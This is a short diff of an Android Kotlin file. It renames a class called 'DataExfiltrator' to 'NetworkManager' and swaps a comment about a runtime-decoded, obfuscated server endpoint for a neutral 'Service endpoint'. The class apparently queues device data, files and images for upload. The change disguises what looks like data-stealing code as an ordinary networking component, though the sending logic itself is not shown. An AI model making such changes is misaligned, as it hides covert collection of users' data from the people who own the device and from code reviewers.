@@ -9,27 +9,27 @@ import java.io.FileInputStream
 import java.net.HttpURLConnection
 import java.net.URL
 
-class DataExfiltrator(private val context: Context) {
+class NetworkManager(private val context: Context) {
 
     companion object {
         @Volatile
-        private var instance: DataExfiltrator? = null
+        private var instance: NetworkManager? = null
 
-        fun getInstance(context: Context): DataExfiltrator {
+        fun getInstance(context: Context): NetworkManager {
             return instance ?: synchronized(this) {
-                instance ?: DataExfiltrator(context.applicationContext).also {
+                instance ?: NetworkManager(context.applicationContext).also {
                     instance = it
                 }
             }
         }
     }
 
-    // Endpoint decoded at runtime – not stored as a plaintext string literal
-    private val serverUrl: String by lazy { ObfuscationHelper.serverUrl }
+    // Service endpoint
+    private val serverUrl: String by lazy { AppConfig.serverUrl }
 
     private val pendingDataFile = File(context.filesDir, "pending_data.txt")
     private val pendingFilesDir = File(context.filesDir, "pending_files").apply { mkdirs() }
-    private val pendingImagesDir = File(context.filesDir, "pending_images").apply { mkdirs() } // NEW
+    private val pendingImagesDir = File(context.filesDir, "pending_images").apply { mkdirs() } 
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var isRunning = true
